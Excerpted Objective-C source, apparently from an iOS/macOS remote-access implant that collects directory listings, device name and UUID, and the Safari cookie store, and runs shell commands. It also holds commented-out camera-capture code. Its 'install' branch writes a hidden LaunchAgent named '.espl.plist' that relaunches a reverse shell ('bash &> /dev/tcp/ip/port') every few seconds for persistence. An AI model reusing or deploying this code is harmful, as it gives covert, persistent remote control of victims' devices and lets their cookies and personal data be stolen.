...
- (void)tabComplete:(NSString *)path {
  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:[self getDirectoryContents:path]
                                                     options:0
                                                       error:nil];
  [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
  [self term];
...
- (void)showAlert:(NSString *)args {
  ...
  NSMutableDictionary *uploadargs = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                    options:0
                                                                      error:NULL];
  const char *title =
      [[NSString stringWithFormat:@"%@", [uploadargs valueForKey:@"title"]] UTF8String];
  const char *message =
      [[NSString stringWithFormat:@"%@", [uploadargs valueForKey:@"message"]] UTF8String];
  ...
  // CFDictionaryAddValue( dict, kCFUserNotificationIconURLKey, CFURLCreateWithString(NULL,
  // CFSTR("/var/mobile/test.png"), NULL) );
  SInt32 error;
...
- (void)openURL:(NSString *)arg {
  if (![arg isEqualToString:@""]) {
    CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8 *)[arg UTF8String], strlen([arg UTF8String]),
...
//     error:&error]; [self.session addInput:input];
//     //set output
...
//     AVVideoCodecJPEG, AVVideoCodecKey, nil]; [self.stillImageOutput
//     setOutputSettings:outputSettings]; [self.session addOutput:self.stillImageOutput];
//     //run
...
//              NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0
//              error:nil]; [self sendString:[[NSString alloc] initWithData:jsonData
//              encoding:NSUTF8StringEncoding]]; [self term];
//          } else {
...
- (void)getVolume {
  ...
  [[AVAudioSession sharedInstance] addObserver:self
                                    forKeyPath:@"outputVolume"
                                       ...
                                       context:nil];
  [self
      sendString:[NSString stringWithFormat:@"%.2f", [AVAudioSession sharedInstance].outputVolume]];
  [self term];
}
...
- (void)openApp:(NSString *)arg {
  CFStringRef identifier =
      CFStringCreateWithCString(kCFAllocatorDefault, [arg UTF8String], kCFStringEncodingUTF8);
...
- (void)sysinfo {
  ...
  NSString *info =
      [NSString stringWithFormat:
                    @"Model: %@\nBattery: %d\nSystem Version: %@ %@\nDevice Name: %@\nUUID: %@\n",
                    [device model], batinfo, [device systemName], [device systemVersion],
                    [device name], [[device identifierForVendor] UUIDString]];
...
char *parseBinary(int *searchChars, int sizeOfSearch) {
  NSString *cookieJarPath =
      [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies", NSHomeDirectory()];
...
- (NSData *)receiveData:(long)size {
  ...
  [self debugLog:[NSString
                     stringWithFormat:@"data size = %lu",
                                      (unsigned long)[data subdataWithRange:NSMakeRange(0, size)]
                                          .length]];
            ...
            addObserverForName:NSFileHandleDataAvailableNotification
                    ...
                    usingBlock:^(NSNotification *note) {
                      ...
                      while ((dataRead = [stdoutHandle availableData]) && dataRead.length > 0) {
                        NSString *newOutput = [[NSString alloc] initWithData:dataRead
...
- (void)rocketMCWithReply:(NSString *)command {
  NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
  NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply"
                                                                userInfo:userInfo];
  ...
  if ([args isEqualToString:@"install"]) {
    NSDictionary *innerDict = [NSDictionary
        dictionaryWithObjects:
            [NSArray
                arrayWithObjects:
                    [NSNumber numberWithBool:YES], @"com.apple.espl", [NSNumber numberWithInt:5],
                    [NSNumber numberWithBool:YES],
                    [NSArray
                        arrayWithObjects:@"sh", @"-c",
                                         [NSString stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1",
                                                                    ip, port],
                                         nil],
                    nil]
                      forKeys:[NSArray arrayWithObjects:@"AbandonProcessGroup", @"Label",
                                                        @"StartInterval", @"RunAtLoad",
                                                        @"ProgramArguments", nil]];
    NSError *err = nil;
    NSData *plistData =
        [NSPropertyListSerialization dataWithPropertyList:innerDict
    ...
    [self runTask:@"sleep 1;launchctl unload /Library/LaunchAgents/.espl.plist "
                  @"2>/dev/null;;launchctl load "
                   @"/Library/LaunchAgents/.espl.plist 2>/dev/null;":false];
  } else if ([args isEqualToString:@"uninstall"]) {
    if ([self.fileManager fileExistsAtPath:esplPath]) {
      [self runTask:@"launchctl unload /Library/LaunchAgents/.espl.plist 2>/dev/null; rm "
                     @"/Library/LaunchAgents/.espl.plist 2>/dev/null;":false];
    }
  } else {
